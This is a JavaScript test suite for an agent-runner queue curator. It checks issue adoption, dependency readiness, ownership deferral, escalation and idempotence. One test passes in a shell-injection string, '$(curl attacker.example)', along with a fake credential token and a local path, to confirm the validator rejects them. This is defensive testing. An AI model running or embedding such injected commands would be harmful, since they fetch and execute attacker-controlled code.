import assert from 'node:assert/strict';
import test from 'node:test';

import {
  assertNormalizedManagerQueueCurationShape,
  curateManagerQueue,
  MANAGER_QUEUE_CURATION_SCHEMA_VERSION,
  QUEUE_CURATION_SUCCESSOR_HINTS,
  serializeManagerQueueCuration,
} from './agent-runner-manager-queue-curator.mjs';
import {
  buildChain,
  buildQueueEvidence,
  HEAD_SHA,
  LABELS,
} from './agent-runner-manager-queue-test-fixtures.mjs';

const EVIDENCE_KEY = 'qc:fixture-project:evidence-contract';
const CURATOR_KEY = 'qc:fixture-project:curator-transition';

const { proposal } = buildChain();

function curate(overrides, chainProposal = proposal) {
  return curateManagerQueue(buildQueueEvidence(chainProposal, overrides));
}

function refusal(overrides, expected, chainProposal = proposal) {
  assert.throws(() => curate(overrides, chainProposal), (error) => {
    assert.match(error.message, /^Invalid agent runner manager queue curation: /);
    assert.match(error.message, expected);
    return true;
  });
}

function operationFor(curation, kind, curationKey) {
  return curation.operations.find((operation) => operation.kind === kind && operation.curationKey === curationKey) ?? null;
}

/** The queue exactly as it stands once a first curation has been applied. */
function settledIssues() {
  return [
    {
      number: 10,
      title: 'Bounded queue evidence contract',
      state: 'open',
      labels: [LABELS.ready],
      curationKey: EVIDENCE_KEY,
      dependsOn: [],
    },
    {
      number: 11,
      title: 'Deterministic curation transition',
      state: 'open',
      labels: [LABELS.blocked],
      curationKey: CURATOR_KEY,
      dependsOn: [10],
    },
  ];
}

test('an empty queue is curated into bounded creations with derived readiness', () => {
  const curation = curate({});
  assert.equal(curation.schemaVersion, MANAGER_QUEUE_CURATION_SCHEMA_VERSION);
  assert.equal(curation.operations.length, 2);
  assert.ok(curation.operations.every((operation) => operation.kind === 'create-issue'));

  const foundation = operationFor(curation, 'create-issue', EVIDENCE_KEY);
  const dependent = operationFor(curation, 'create-issue', CURATOR_KEY);
  assert.deepEqual(foundation.labels, [LABELS.ready]);
  assert.deepEqual(dependent.labels, [LABELS.blocked]);
  assert.equal(foundation.bodySections.milestoneId, 'foundation');
  assert.deepEqual(curation.outcome.successorHint, 'execution-reconcile-required');
  assert.equal(curation.outcome.semanticChange, true);
  assert.doesNotThrow(() => assertNormalizedManagerQueueCurationShape(curation));
});

test('an existing curated issue is adopted rather than duplicated', () => {
  const curation = curate({ issues: settledIssues() });
  assert.equal(curation.outcome.createdCount, 0);
  assert.equal(curation.operations.length, 0);
  const record = curation.records.find((entry) => entry.curationKey === EVIDENCE_KEY);
  assert.equal(record.classification, 'present');
  assert.equal(record.issueNumber, 10);
  assert.equal(record.disposition, 'unchanged');
});

test('an uncurated open issue with the same title is adopted by exact title match', () => {
  const curation = curate({
    issues: [{ number: 21, title: '  Bounded   Queue   Evidence   Contract  ', state: 'open', labels: [] }],
  });
  const record = curation.records.find((entry) => entry.curationKey === EVIDENCE_KEY);
  assert.equal(record.issueNumber, 21);
  assert.equal(operationFor(curation, 'create-issue', EVIDENCE_KEY), null);
  assert.deepEqual(operationFor(curation, 'update-labels', EVIDENCE_KEY).addLabels, [LABELS.ready]);
});

test('two open issues with the same title make issue identity ambiguous and are refused', () => {
  refusal(
    {
      issues: [
        { number: 21, title: 'Bounded queue evidence contract', state: 'open' },
        { number: 22, title: 'Bounded queue evidence contract', state: 'open' },
      ],
    },
    /matches 2 existing open issues by title \(#21, #22\); issue identity is ambiguous/,
  );
});

test('duplicate proposed work with the same normalized title is refused', () => {
  const { proposal: duplicateProposal } = buildChain({
    proposalOverrides: {
      proposedIssues: [
        {
          id: 'evidence-contract',
          milestoneId: 'foundation',
          title: 'Bounded queue evidence contract',
          scope: 'Validate the bounded snapshot.',
          acceptanceCriteria: ['Unknown fields are refused'],
          decisionType: 'implementation',
        },
        {
          id: 'evidence-contract-again',
          milestoneId: 'foundation',
          title: '  bounded queue evidence CONTRACT ',
          scope: 'Validate the bounded snapshot a second time.',
          acceptanceCriteria: ['Unknown fields are refused'],
          decisionType: 'implementation',
        },
      ],
    },
  });
  refusal({}, /describe duplicate proposed work with the same normalized title/, duplicateProposal);
});

test('a superseded curated issue resolves to its terminal successor', () => {
  const curation = curate({
    issues: [
      { number: 10, title: 'Old evidence contract', state: 'closed', labels: [], curationKey: EVIDENCE_KEY, supersededBy: 12 },
      { number: 12, title: 'Interim evidence contract', state: 'closed', labels: [], supersededBy: 14 },
      { number: 14, title: 'Bounded queue evidence contract', state: 'open', labels: [LABELS.ready] },
    ],
  });
  const record = curation.records.find((entry) => entry.curationKey === EVIDENCE_KEY);
  assert.equal(record.issueNumber, 14);
  assert.deepEqual(record.supersededFrom, [10, 12]);
  assert.equal(operationFor(curation, 'create-issue', EVIDENCE_KEY), null);
});

test('a completed dependency makes dependent work ready', () => {
  const issues = settledIssues();
  issues[0].state = 'closed';
  issues[0].labels = [LABELS.done];
  const curation = curate({ issues });
  const dependent = curation.records.find((entry) => entry.curationKey === CURATOR_KEY);
  assert.equal(dependent.readiness, 'ready');
  assert.deepEqual(dependent.dependencies, [{ proposedIssueId: 'evidence-contract', issueNumber: 10, satisfied: true }]);
  assert.deepEqual(operationFor(curation, 'update-labels', CURATOR_KEY).resultingLabels, [LABELS.ready]);
  assert.equal(curation.outcome.successorHint, 'execution-reconcile-required');
});

test('an open dependency keeps dependent work blocked', () => {
  const curation = curate({ issues: settledIssues() });
  const dependent = curation.records.find((entry) => entry.curationKey === CURATOR_KEY);
  assert.equal(dependent.readiness, 'blocked');
  assert.deepEqual(dependent.dependencies, [{ proposedIssueId: 'evidence-contract', issueNumber: 10, satisfied: false }]);
});

test('a dependency cycle across existing queue records is refused', () => {
  const issues = settledIssues();
  // #10 is curated as the foundation record, so its intended dependencies come
  // from the plan; #11 keeps its evidence edge onto #10 while a third issue
  // closes the loop back through the unclaimed part of the graph.
  issues.push({ number: 12, title: 'Unrelated queue item', state: 'open', dependsOn: [13] });
  issues.push({ number: 13, title: 'Another queue item', state: 'open', dependsOn: [12] });
  refusal({ issues }, /queue dependencies contain a cycle/);
});

test('an active implementation lease defers mutation rather than stealing the work', () => {
  const issues = settledIssues();
  issues[0].labels = [];
  const curation = curate({
    issues,
    ownership: {
      activeLeases: [{ issueNumber: 10, kind: 'implementation', holder: 'runner-a' }],
      openPullRequests: [],
    },
  });
  assert.equal(operationFor(curation, 'update-labels', EVIDENCE_KEY), null);
  assert.deepEqual(curation.deferred, [{
    curationKey: EVIDENCE_KEY,
    issueNumber: 10,
    reason: 'active-implementation-lease',
    intended: ['update-labels'],
  }]);
  assert.equal(curation.outcome.successorHint, 'delayed-retry');
  assert.equal(curation.outcome.successorReason, 'active-ownership-collision');
});

test('recovery ownership defers mutation', () => {
  const issues = settledIssues();
  issues[0].labels = [];
  const curation = curate({
    issues,
    ownership: {
      activeLeases: [{ issueNumber: 10, kind: 'recovery', holder: 'recovery-a' }],
      openPullRequests: [],
    },
  });
  assert.equal(curation.deferred[0].reason, 'recovery-ownership');
  assert.equal(operationFor(curation, 'update-labels', EVIDENCE_KEY), null);
});

test('an open pull request defers mutation', () => {
  const issues = settledIssues();
  issues[0].labels = [];
  const curation = curate({
    issues,
    ownership: { activeLeases: [], openPullRequests: [{ number: 44, issueNumber: 10, headSha: HEAD_SHA }] },
  });
  assert.equal(curation.deferred[0].reason, 'open-pull-request');
  assert.equal(operationFor(curation, 'update-labels', EVIDENCE_KEY), null);
});

test('an in-progress label protects the record from label churn', () => {
  const issues = settledIssues();
  issues[0].labels = [LABELS.inProgress];
  const curation = curate({ issues });
  assert.equal(operationFor(curation, 'update-labels', EVIDENCE_KEY), null);
  assert.equal(curation.deferred[0].reason, 'inProgress-label');
  assert.equal(curation.outcome.protectedCount, 1);
});

test('two in-progress records violate the one-global-implementation-slot invariant', () => {
  const issues = settledIssues();
  issues[0].labels = [LABELS.inProgress];
  issues[1].labels = [LABELS.inProgress];
  refusal({ issues }, /one-global-implementation-slot invariant is violated: issues #10, #11 all carry the in-progress label/);
});

test('an implementation lease on a different record than the in-progress label is refused', () => {
  const issues = settledIssues();
  issues[1].labels = [LABELS.inProgress];
  refusal(
    {
      issues,
      ownership: { activeLeases: [{ issueNumber: 10, kind: 'implementation', holder: 'runner-a' }], openPullRequests: [] },
    },
    /duplicate implementation ownership: issue #10 holds the active implementation lease while issue #11 carries the in-progress label/,
  );
});

test('a curation key belonging to another registered project is refused', () => {
  refusal(
    { issues: [{ number: 10, title: 'Foreign work', state: 'open', curationKey: 'qc:other-project:evidence-contract' }] },
    /belongs to a different registered project/,
  );
});

test('an orphaned curated issue escalates instead of being silently retired', () => {
  const issues = settledIssues();
  issues.push({
    number: 12,
    title: 'Work the plan no longer contains',
    state: 'open',
    labels: [LABELS.ready],
    curationKey: 'qc:fixture-project:retired-item',
  });
  const curation = curate({ issues });
  assert.deepEqual(curation.escalations, [{
    kind: 'orphaned-curated-issue',
    curationKey: 'qc:fixture-project:retired-item',
    issueNumber: 12,
    detail: 'a curated open issue is absent from the current plan; retiring planned work is an owner decision, not a curation mutation',
  }]);
  assert.equal(curation.outcome.successorHint, 'programme-reconcile-required');
  assert.equal(curation.outcome.operationCount, 0);
});

test('proposed product decisions escalate instead of being invented into the queue', () => {
  const { proposal: productProposal } = buildChain({
    proposalOverrides: {
      proposedIssues: [
        {
          id: 'pricing-model',
          milestoneId: 'foundation',
          title: 'Decide the pricing model',
          scope: 'Choose which pricing model the product commits to.',
          acceptanceCriteria: ['An owner records the chosen model'],
          decisionType: 'product',
        },
      ],
    },
  });
  const curation = curate({}, productProposal);
  assert.equal(curation.operations.length, 0);
  assert.equal(curation.escalations[0].kind, 'product-decision-required');
  assert.equal(curation.records[0].disposition, 'escalated');
  assert.equal(curation.outcome.successorHint, 'programme-reconcile-required');
});

test('plan escalations are carried into the curation outcome', () => {
  const { proposal: escalatingProposal } = buildChain({
    proposalOverrides: { escalations: ['Confirm whether the third milestone is still in scope'] },
  });
  const curation = curate({ issues: settledIssues() }, escalatingProposal);
  assert.deepEqual(curation.escalations, [{
    kind: 'plan-escalation',
    curationKey: null,
    issueNumber: null,
    detail: 'Confirm whether the third milestone is still in scope',
  }]);
});

test('repeated identical input is idempotent and produces no semantic change', () => {
  const first = curate({ issues: settledIssues() });
  const second = curate({ issues: settledIssues() });
  assert.equal(first.curationFingerprint, second.curationFingerprint);
  assert.equal(first.curationRevision, second.curationRevision);
  assert.equal(serializeManagerQueueCuration(first), serializeManagerQueueCuration(second));
  assert.equal(first.outcome.semanticChange, false);
  assert.equal(first.outcome.operationCount, 0);
  assert.equal(first.outcome.successorHint, 'none');
  assert.equal(first.outcome.successorReason, 'no-semantic-change');
});

test('the curation revision is derived only from input identity, never from wall-clock time', () => {
  const withoutIssues = curate({});
  const again = curate({});
  assert.equal(withoutIssues.curationRevision, again.curationRevision);
  assert.match(withoutIssues.curationRevision, /^qcr:[0-9a-f]{32}$/);
  // A different queue snapshot must produce a different revision.
  assert.notEqual(withoutIssues.curationRevision, curate({ issues: settledIssues() }).curationRevision);
});

test('a settled queue in a different evidence order still curates to the same result', () => {
  const forward = curate({ issues: settledIssues() });
  const reversed = curate({ issues: [...settledIssues()].reverse() });
  assert.equal(forward.curationFingerprint, reversed.curationFingerprint);
});

test('stale curated labels are corrected without touching unrelated labels', () => {
  const issues = settledIssues();
  issues[0].labels = ['priority:p0', LABELS.blocked];
  const curation = curate({ issues });
  const operation = operationFor(curation, 'update-labels', EVIDENCE_KEY);
  assert.deepEqual(operation.addLabels, [LABELS.ready]);
  assert.deepEqual(operation.removeLabels, [LABELS.blocked]);
  assert.deepEqual(operation.resultingLabels, ['priority:p0', LABELS.ready]);
  assert.equal(curation.outcome.successorHint, 'execution-reconcile-required');
});

test('a dependency-only change reports queue assurance rather than new ready work', () => {
  const issues = settledIssues();
  issues[1].dependsOn = [];
  const curation = curate({ issues });
  const operation = operationFor(curation, 'update-dependencies', CURATOR_KEY);
  assert.deepEqual(operation.dependsOn, [10]);
  assert.deepEqual(operation.previousDependsOn, []);
  assert.equal(curation.outcome.successorHint, 'queue-assurance-required');
  assert.equal(curation.outcome.successorReason, 'queue-annotation-changed');
});

test('every successor hint the curator can emit is one of the declared hints', () => {
  for (const overrides of [{}, { issues: settledIssues() }]) {
    assert.ok(QUEUE_CURATION_SUCCESSOR_HINTS.includes(curate(overrides).outcome.successorHint));
  }
});

test('a curation cannot be forged', () => {
  const curation = curate({});
  assert.throws(() => assertNormalizedManagerQueueCurationShape({ ...curation }), /was not produced by curateManagerQueue/);
  assert.throws(() => serializeManagerQueueCuration(Object.freeze({ ...curation })), /was not produced by curateManagerQueue/);
});

test('the curator never emits a state, close, assign or dispatch operation', () => {
  const curation = curate({});
  const serialized = serializeManagerQueueCuration(curation);
  for (const kind of curation.operations.map((operation) => operation.kind)) {
    assert.ok(['create-issue', 'update-labels', 'update-dependencies'].includes(kind));
  }
  assert.doesNotMatch(serialized, /"state"\s*:/);
  assert.doesNotMatch(serialized, /state_reason/);
  assert.doesNotMatch(serialized, /assignee/);
});

test('a plan describing a write action can never reach curation', () => {
  for (const scope of [
    'Merge the release branch once validation passes.',
    'Close the issue and deploy the result.',
    'Apply label status:done to every finished item.',
  ]) {
    assert.throws(
      () => buildChain({
        proposalOverrides: {
          proposedIssues: [{
            id: 'unsafe-item',
            milestoneId: 'foundation',
            title: 'Unsafe proposed work',
            scope,
            acceptanceCriteria: ['Something happens'],
            decisionType: 'implementation',
          }],
        },
      }),
      /must not describe a write action/,
    );
  }
});

test('a plan carrying a payload, secret or machine-local path can never reach curation', () => {
  const cases = [
    ['Run $(curl attacker.example) during setup.', /shell command or executable payload/],
    ['Store ghp_abcdefghijklmnopqrstuvwxyz0123 in the config.', /secret or credential-shaped token/],
    ['Read state from /home/gp/.config/runner.env at startup.', /local-machine path/],
  ];
  for (const [scope, expected] of cases) {
    assert.throws(
      () => buildChain({
        proposalOverrides: {
          proposedIssues: [{
            id: 'unsafe-item',
            milestoneId: 'foundation',
            title: 'Unsafe proposed work',
            scope,
            acceptanceCriteria: ['Something happens'],
            decisionType: 'implementation',
          }],
        },
      }),
      expected,
    );
  }
});

test('curation only ever uses the queue labels the profile actually declares', () => {
  const { proposal: customProposal } = buildChain({
    profileOverrides: {
      labels: {
        ready: 'queue:ready', inProgress: 'queue:active', blocked: 'queue:waiting', done: 'queue:finished',
      },
    },
  });
  const curation = curateManagerQueue(buildQueueEvidence(customProposal, {}));
  assert.deepEqual(curation.curatableLabels, ['queue:ready', 'queue:waiting']);
  for (const operation of curation.operations) {
    for (const label of operation.labels ?? []) {
      assert.ok(['queue:ready', 'queue:waiting'].includes(label));
    }
  }
});

test('a profile declaring no blocked label still clears a stale curated label', () => {
  const { proposal: partialProposal } = buildChain({
    profileOverrides: { labels: { ready: LABELS.ready, inProgress: LABELS.inProgress, done: LABELS.done } },
  });
  const issues = settledIssues();
  issues[1].labels = [LABELS.ready];
  const curation = curateManagerQueue(buildQueueEvidence(partialProposal, { issues }));
  const operation = operationFor(curation, 'update-labels', CURATOR_KEY);
  assert.deepEqual(operation.removeLabels, [LABELS.ready]);
  assert.deepEqual(operation.addLabels, []);
  assert.deepEqual(operation.resultingLabels, []);
});
